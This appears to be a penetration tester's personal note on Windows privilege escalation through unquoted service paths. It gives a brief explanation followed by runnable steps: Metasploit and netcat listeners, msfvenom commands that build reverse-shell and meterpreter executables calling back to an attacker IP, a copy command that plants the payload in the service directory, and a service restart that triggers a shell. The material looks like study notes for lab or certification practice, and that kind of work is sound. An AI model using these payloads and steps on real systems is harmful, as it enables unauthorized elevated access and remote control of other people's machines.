-- -
[[Dark Arts/Privesc/Windows/Enumeration/Unquoted Service Paths|Enum]]
As it sounds, you know what this is. The service has a path that includes a space (and isn't inside quotation marks!) in it so you just make sure to have control of (or make your own) directory of the first word before the space, then put your malware in that directory so that when the service goes to run, it picks up your malware thinking it found the right program and stops looking for the actual program.

For example, if the path is `C:\Program Files\service.exe`, you put your malware in `C:\program.exe`, and that gets picked up before the first path. 
#### Setup listener
```bash
# meterpreter
msfconsole
use multi/handler
set lhost=<attack ip>
set lport=<port>
run

# reverse shell
nc -nvlp <port>
```
#### Payload
Or go to [Rev Shell Gen](https://revshell.xehn.lol)
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attack ip> LPORT=<port> -f exe -o common.exe

msfvenom -p windows/x64/reverse_tcp LHOST=<attack ip> LPORT=<port> -f exe -o common.exe

msfvenom -p windows/shell_reverse_tcp LHOST=<attack ip> LPORT=<port> -f exe -o common.exe
```
#### Exploit
[[Dark Arts I/File Transfer/Windows|File transfer]] payload to target machine
```powershell
# in this example, the unquoted service path is
# C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
# so we will place the payload as:
# C:\Program Files\Unquoted Path Service\common.exe
copy common.exe "C:\Program Files\Unquoted Path Service\common.exe"

# now start/restart the service
sc start <service> 
sc start unquotedpathsvc

# and you should now have a shell
```